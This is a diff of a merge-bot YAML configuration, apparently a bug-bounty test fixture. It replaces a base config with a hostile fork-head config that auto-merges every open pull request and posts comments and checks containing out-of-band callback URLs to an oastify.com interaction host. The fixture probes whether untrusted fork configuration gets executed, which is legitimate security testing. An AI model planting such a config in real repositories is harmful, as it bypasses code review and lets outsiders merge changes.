@@ -1,25 +1,21 @@
-# Bug-bounty test fixture (B2). Legitimate-looking base configuration.
 queue_rules:
-  - name: default
-    queue_conditions:
-      - label=ready-to-merge
+  - name: b2hostile
+    queue_conditions: []
     merge_conditions: []
     merge_method: merge
 
 pull_request_rules:
-  - name: B2 base config greets every PR
+  - name: B2 HEAD CONFIG EXECUTED - must never run
     conditions:
       - -closed
     actions:
       comment:
-        message: "B2-BASE-CONFIG-EXECUTED author={{author}} head={{head}} title={{title}}"
+        message: "B2-HEAD-CONFIG-EXECUTED oob=http://5u0u8ig9ynncyis2w44r97ra71dv1k.oastify.com/head-comment author={{author}}"
       label:
         add:
-          - b2-base-touched
-
-  - name: B2 base queue on label
-    conditions:
-      - label=ready-to-merge
-    actions:
-      queue:
-        name: default
+          - b2-head-config-executed
+      post_check:
+        title: "B2-HEAD-CONFIG-EXECUTED"
+        summary: "fork head configuration was evaluated: http://5u0u8ig9ynncyis2w44r97ra71dv1k.oastify.com/post-check"
+      merge:
+        method: merge
